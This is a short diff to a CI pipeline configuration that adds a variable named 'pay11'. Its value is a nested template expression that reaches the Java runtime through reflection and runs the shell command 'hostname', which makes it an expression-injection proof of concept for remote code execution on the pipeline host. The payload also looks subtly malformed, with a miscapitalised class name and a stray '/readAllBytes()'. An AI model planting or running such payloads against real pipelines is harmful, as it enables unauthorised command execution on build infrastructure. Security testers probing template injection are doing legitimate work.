@@ -41,6 +41,12 @@ pipeline:
               errors: []
               action:
                 type: Ignore
+        variables:
+          - name: pay11
+            type: String
+            description: ""
+            required: false
+            value: <+<+<+<+<+<+<+'some'>.getClass()>.forName('java.lang.runtime')>.getRuntime()>.exec('hostname')>.getInputStream()>/readAllBytes()>
   properties:
     ci:
       codebase:
